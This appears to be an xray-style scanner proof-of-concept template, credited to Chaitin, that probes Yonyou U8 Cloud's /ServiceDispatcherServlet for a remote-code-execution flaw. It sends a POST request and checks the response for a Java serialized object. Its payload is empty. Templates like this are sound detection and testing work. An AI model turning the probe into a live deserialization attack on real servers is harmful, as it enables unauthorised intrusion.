name: poc-yaml-yonyou-u8cloud-servicedispatcher-rce
manual: true
transport: http
set:
    payload: base64Decode("")
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /ServiceDispatcherServlet
            headers:
                Content-Type: '*'
            body: '{{payload}}'
            follow_redirects: false
        expression: response.status == 200 && response.headers["Content-Type"] == "application/x-java-serialized-object" && response.body.bcontains(b"\xbcrq\xe2")
expression: r1()
detail:
    author: Chaitin
    links:
        - https://stack.chaitin.com/techblog/detail/155
